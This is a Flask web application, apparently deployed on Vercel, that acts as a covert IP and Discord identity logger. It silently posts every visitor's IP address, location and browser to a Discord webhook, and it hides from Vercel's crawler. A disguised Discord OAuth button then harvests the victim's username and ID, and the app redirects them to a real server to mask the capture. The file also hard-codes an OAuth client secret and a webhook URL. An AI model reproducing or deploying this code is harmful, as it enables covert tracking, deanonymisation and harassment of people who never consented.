import os
from flask import Flask, render_template, request, redirect
import requests

# Inicializamos Flask. Vercel requiere que el archivo esté en la carpeta api/
# Configuramos la carpeta de templates relativa a este archivo.
app = Flask(__name__, template_folder='templates')

# --- CONFIGURACIÓN DE CREDENCIALES ---
CLIENT_ID     = "1457527346687901812"
CLIENT_SECRET = "8NXd3i8r1QXproq-MMf8EqW_BJOujcPR"
REDIRECT_URI  = "https://logger-page-g0oldyv1y-ola950857gmailcoms-projects.vercel.app/callback"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1456993989306749133/2JG3BvXA__irPAOcgx-R-lTPC7n7ScgWSgUl0jMmnR-staCUFK0b0upG2LwDHfck1ean"
AVATAR_URL = "https://i.pinimg.com/736x/10/e3/f5/10e3f51d11ef13d5c88cb329211146ba.jpg"

def get_client_data():
    """Obtiene la IP y ubicación real usando los headers de Vercel."""
    ip = request.headers.get('x-real-ip')
    if not ip:
        ip = request.headers.get('x-forwarded-for', request.remote_addr)
        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()
    
    city = request.headers.get('x-vercel-ip-city', 'Desconocida')
    country = request.headers.get('x-vercel-ip-country', 'ES')
    region = request.headers.get('x-vercel-ip-country-region', 'N/A')
    
    return {
        'ip': ip,
        'city': city,
        'country': country,
        'region': region,
        'ua': request.headers.get('user-agent', 'Desconocido')
    }

@app.route('/')
def index():
    data = get_client_data()
    
    # Filtro para el bot de Vercel (Screenshot) y otros crawlers
    if 'vercel' in data['ua'].lower() or data['city'] == 'Santa Clara':
        return render_template('index.html', auth_url="#")

    # LOG 1: Captura automática al entrar
    requests.post(DISCORD_WEBHOOK_URL, json={
        "username": "1* Tracker - Visita",
        "avatar_url": AVATAR_URL,
        "embeds": [{
            "title": "👁️ Conexión Detectada",
            "color": 0x5865F2,
            "fields": [
                {"name": "🌐 IP Pública", "value": f"**`{data['ip']}`**", "inline": True},
                {"name": "📍 Ubicación", "value": f"{data['city']}, {data['country']} ({data['region']})", "inline": True},
                {"name": "📱 Browser", "value": f"```\n{data['ua'][:100]}\n```", "inline": False}
            ],
            "footer": {"text": "al3xg0nzalezzz • Registro Automático"}
        }]
    })

    # Link para el botón de Discord camuflado
    auth_url = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify"
    return render_template('index.html', auth_url=auth_url)

@app.route('/callback')
def callback():
    """Ruta que recibe el código de Discord tras la autorización."""
    code = request.args.get('code')
    if not code:
        return redirect("https://discord.gg/nUy6Vjr9YU")

    try:
        # Intercambiar el código por un Access Token
        r_token = requests.post("https://discord.com/api/v10/oauth2/token", data={
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI
        }, headers={'Content-Type': 'application/x-www-form-urlencoded'})
        
        token_data = r_token.json()
        token = token_data.get('access_token')

        if token:
            # Obtener datos del usuario de Discord
            user = requests.get("https://discord.com/api/v10/users/@me", headers={'Authorization': f'Bearer {token}'}).json()
            data = get_client_data()

            # LOG 2: Información de identidad + IP vinculada
            requests.post(DISCORD_WEBHOOK_URL, json={
                "username": "1* Tracker - IDENTIDAD",
                "avatar_url": AVATAR_URL,
                "embeds": [{
                    "title": "🎯 ¡IDENTIDAD CAPTURADA!",
                    "color": 0xFF0044,
                    "thumbnail": {"url": f"https://cdn.discordapp.com/avatars/{user['id']}/{user['avatar']}.png" if user.get('avatar') else AVATAR_URL},
                    "fields": [
                        {"name": "👤 Usuario", "value": f"**{user['username']}**", "inline": True},
                        {"name": "🆔 Discord ID", "value": f"`{user['id']}`", "inline": True},
                        {"name": "🌐 IP Real", "value": f"**`{data['ip']}`**", "inline": False},
                        {"name": "📍 Origen", "value": f"{data['city']}, {data['country']}", "inline": True}
                    ],
                    "footer": {"text": "al3xg0nzalezzz • Sincronización Exitosa"}
                }]
            })
    except Exception as e:
        print(f"Error en el callback: {e}")

    # Redirigir al servidor de Discord real al terminar
    return redirect("https://discord.gg/nUy6Vjr9YU")

# Vercel busca el objeto 'app' para ejecutar la función
# app = app